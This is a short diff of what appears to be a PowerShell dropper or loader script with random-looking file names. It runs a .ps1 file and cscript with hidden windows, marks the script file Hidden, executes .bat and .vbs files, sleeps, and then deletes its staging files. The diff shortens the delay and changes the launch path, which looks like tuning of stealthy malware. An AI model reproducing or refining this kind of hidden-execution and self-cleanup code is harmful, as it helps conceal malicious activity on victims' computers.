@@ -126,7 +126,7 @@ Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwj
 
 Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"
 
-Start-Process -FilePath "$initial_dir\AEQKCPrkuifY.ps1" -windowstyle hidden
+Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
 
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
@@ -139,6 +139,6 @@ Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
 
 & "./TMqhONoBljEv.vbs"
 
-Start-Sleep -Seconds 3700
+Start-Sleep -Seconds 340
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
